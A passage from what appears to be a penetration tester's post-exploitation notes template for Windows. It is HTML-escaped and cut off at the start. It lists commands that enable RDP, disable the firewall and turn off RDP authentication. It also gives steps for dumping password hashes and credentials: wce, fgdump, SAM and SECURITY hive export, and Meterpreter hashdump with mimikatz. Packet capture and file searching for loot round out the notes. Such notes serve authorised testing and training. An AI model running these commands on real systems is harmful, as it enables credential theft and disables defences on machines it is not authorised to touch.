class=\"hljs-string\">\"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\"</span> /v fDenyTSConnections /t REG_DWORD /d <span class=\"hljs-number\">0</span> /f\n\nTurn firewall off\nnetsh firewall set opmode disable\n\nOr like this\nreg add <span class=\"hljs-string\">\"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\"</span> /v fDenyTSConnections /t REG_DWORD /d <span class=\"hljs-number\">0</span> /f\n\nIf you get this <span class=\"hljs-symbol\">error:</span>\n\n<span class=\"hljs-string\">\"ERROR: CredSSP: Initialize failed, do you have correct kerberos tgt initialized ?\nFailed to connect, CredSSP required by server.\"\"\n\nAdd this reg key:\n\nreg add \"</span>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp<span class=\"hljs-string\">\" /v UserAuthentication /t REG_DWORD /d 0 /f\n</span></pre><p><br></p><p><br></p><pre class=\"ql-syntax\" spellcheck=\"false\">----------------------------- LOOT LOOT LOOT LOOT -------------------\n</pre><p><br></p><p><br></p><p><strong style=\"font-size: 20px; color: rgb(68, 68, 68); font-family: martel-sans;\">Loot</strong></p><p><strong style=\"font-size: 16px; color: rgb(68, 68, 68); font-family: martel-sans;\">Checklist</strong></p><p><br></p><ul data-checked=\"false\"><li><span style=\"font-size: 16px; color: rgb(68, 68, 68); font-family: martel-sans;\">Proof:</span></li><li><span style=\"font-size: 16px; color: rgb(68, 68, 68); font-family: martel-sans;\">Network secret:</span></li><li><span style=\"font-size: 16px; color: rgb(68, 68, 68); font-family: martel-sans;\">Passwords and hashes:</span></li><li><span style=\"font-size: 16px; color: rgb(68, 68, 68); font-family: martel-sans;\">Dualhomed:</span></li><li><span style=\"font-size: 16px; color: rgb(68, 68, 68); font-family: martel-sans;\">Tcpdump:</span></li><li><span style=\"font-size: 16px; color: rgb(68, 68, 68); font-family: martel-sans;\">Interesting files:</span></li><li><span style=\"font-size: 16px; color: rgb(68, 68, 68); font-family: martel-sans;\">Databases:</span></li><li><span style=\"font-size: 16px; color: rgb(68, 68, 68); font-family: martel-sans;\">SSH-keys:</span></li><li><span style=\"font-size: 16px; color: rgb(68, 68, 68); font-family: martel-sans;\">Browser:</span></li></ul><p><br></p><p><br></p><p><strong style=\"color: rgb(68, 68, 68); font-size: 16px; font-family: martel-sans;\">Proof</strong></p><p><br></p><p><strong style=\"color: rgb(68, 68, 68); font-size: 16px; font-family: martel-sans;\">﻿</strong></p><p><strong style=\"color: rgb(68, 68, 68); font-size: 16px; font-family: martel-sans;\">Network secret</strong></p><p><br></p><p><br></p><p><strong style=\"color: rgb(68, 68, 68); font-size: 16px; font-family: martel-sans;\">Passwords and hashes</strong></p><pre class=\"ql-syntax\" spellcheck=\"false\">wce32.exe -w\nwce64.exe -w\nfgdump.exe\n\nreg.exe save hklm\\sam <span class=\"hljs-symbol\">c:</span>\\sam_backup\nreg.exe save hklm\\security <span class=\"hljs-symbol\">c:</span>\\security_backup\nreg.exe save hklm\\system <span class=\"hljs-symbol\">c:</span>\\system\n\n<span class=\"hljs-comment\"># Meterpreter</span>\nhashdump\nload mimikatz\nmsv\n</pre><p><br></p><p><br></p><p><strong style=\"color: rgb(68, 68, 68); font-size: 16px; font-family: martel-sans;\">Dualhomed</strong></p><pre class=\"ql-syntax\" spellcheck=\"false\">ipconfig /all\nroute <span class=\"hljs-keyword\">print</span>\n\n<span class=\"hljs-comment\"># What other machines have been connected</span>\narp -a\n</pre><p><br></p><p><br></p><p><strong style=\"color: rgb(68, 68, 68); font-size: 16px; font-family: martel-sans;\">Tcpdump</strong></p><pre class=\"ql-syntax\" spellcheck=\"false\"><span class=\"hljs-comment\"># Meterpreter</span>\nrun packetrecorder -li\nrun packetrecorder -i <span class=\"hljs-number\">1</span>\n</pre><p><br></p><p><br></p><p><strong style=\"color: rgb(68, 68, 68); font-size: 16px; font-family: martel-sans;\">Interesting files</strong></p><pre class=\"ql-syntax\" spellcheck=\"false\"><span class=\"hljs-comment\">#Meterpreter</span>\nsearch -f *.txt\nsearch -f *.zip\nsearch -f *.doc\nsearch -f *.xls\nsearch -f config*\nsearch -f *.rar\nsearch -f *.docx\nsearch -f *.sql\n\n<span class=\"hljs-comment\"># How to cat files in meterpreter</span>\ncat <span class=\"hljs-symbol\">c:</span>\\\\Inetpub\\\\iissamples\\\\sdk\\\\asp\\\\components\\\\adrot.txt\n\n<span class=\"hljs-comment\"># Recursive search</span>\ndir /s\n</pre><p><br></p><p><br></p><p><strong style=\"color: rgb(68, 68, 68); font-size: 16px; font-family: martel-sans;\">Mail</strong></p><p><br></p><p><br></p><p><strong style=\"color: rgb(68, 68, 68); font-size: 16px; font-family: martel-sans;\">Browser</strong></p><ul><li><span style=\"color: rgb(68, 68, 68); font-size: 16px; font-family: martel-sans;\">Browser start-page:</span></li><li><span style=\"color: rgb(68, 68, 68); font-size: 16px; font-family: martel-sans;\">Browser-history:</span></li><li><span style=\"color: rgb(68, 68, 68); font-size: 16px; font-family: martel-sans;\">Saved passwords:</span></li></ul><p><br></p><p><br></p><p><strong style=\"color: rgb(68, 68, 68); font-size: 16px; font-family: martel-sans;\">Databases</strong></p><p><br></p><p><br></p><p><strong style=\"color: rgb(68, 68, 68); font-size: 16px; font-family: martel-sans;\">SSH-keys</strong></p><p><br></p><p><br></p><p><strong style=\"color: rgb(68, 68, 68); font-size: 20px; font-family: martel-sans;\">How to replicate:</strong></p>","color":"light-red"}],"payloads":[]}
